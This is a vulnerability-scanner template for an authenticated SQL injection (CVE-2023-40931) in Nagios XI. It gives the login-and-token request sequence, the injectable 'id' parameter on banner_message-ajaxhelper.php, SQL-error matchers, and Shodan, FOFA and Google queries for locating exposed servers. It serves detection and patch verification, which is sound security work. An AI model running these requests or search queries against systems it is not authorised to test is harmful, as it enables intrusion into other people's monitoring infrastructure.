http:
- extractors:
  - group: 1
    internal: true
    name: nsp
    part: body
    regex:
    - name=['"]nsp['"] value=['"](.*)['"]>
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - Failed to acknowledge
    - SQL Error
    - right syntax to use near
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /nagiosxi/login.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /nagiosxi/login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    nsp={{nsp}}&pageopt=login&username={{username}}&password={{password}}

    '
  - 'POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=acknowledge_banner_message&id=*

    '
id: CVE-2023-40931
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:nagios:nagios_xi:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-40931
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cwe-id: CWE-89
    epss-percentile: 0.99347
    epss-score: 0.85843
  description: 'A SQL injection vulnerability in Nagios XI from version 5.11.0 up
    to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL
    commands via the ID parameter in the POST request to /nagiosxi/admin/banner_message-ajaxhelper.php.

    '
  impact: 'Successful exploitation of this vulnerability allows an authenticated attackers
    to execute arbitrary SQL commands.

    '
  metadata:
    fofa-query: app="nagios-xi"
    google-query: intitle:"nagios xi"
    max-request: 3
    product: nagios_xi
    shodan-query: title:"Nagios XI"
    vendor: nagios
    verified: true
  name: Nagios XI v5.11.0 - SQL Injection
  reference:
  - https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c
  - https://nvd.nist.gov/vuln/detail/CVE-2023-40931
  remediation: 'Upgrade Nagios XI to a patched version or apply the vendor-supplied
    patch to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2023,cve,authenticated,nagiosxi,sqli,nagios,vuln
